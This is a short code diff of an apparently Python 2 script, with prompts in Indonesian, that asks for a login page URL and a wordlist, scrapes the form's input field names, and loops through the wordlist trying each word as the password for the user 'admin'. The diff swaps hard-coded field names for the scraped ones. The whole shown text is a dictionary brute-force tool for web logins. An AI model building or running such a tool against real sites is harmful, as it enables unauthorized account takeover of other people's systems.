@@ -11,19 +11,17 @@ from bs4 import BeautifulSoup
 
 input1 = raw_input("Masukkan URL halaman login : ")
 
-list_variabel_input = ambiltag.fetchListInput(input1)
 
-
-
-
+direct_login = raw_input("Masukkan direct : ")
+list_variabel_input = ambiltag.fetchListInput(direct_login)
 file = open(raw_input("Masukkan path ke word list yang digunakan : "), 'rt')
 
 for x in file.readlines():
 	x = x.strip()
 	print "Trying " + x
 	data1 = {
-		"input1" : "admin",
-		"input2" : "%s" %x,
+		list_variabel_input[0] : "admin",
+		list_variabel_input[1] : "%s" %x,
 		"submit" : "kirim"
 	}
 	print data1
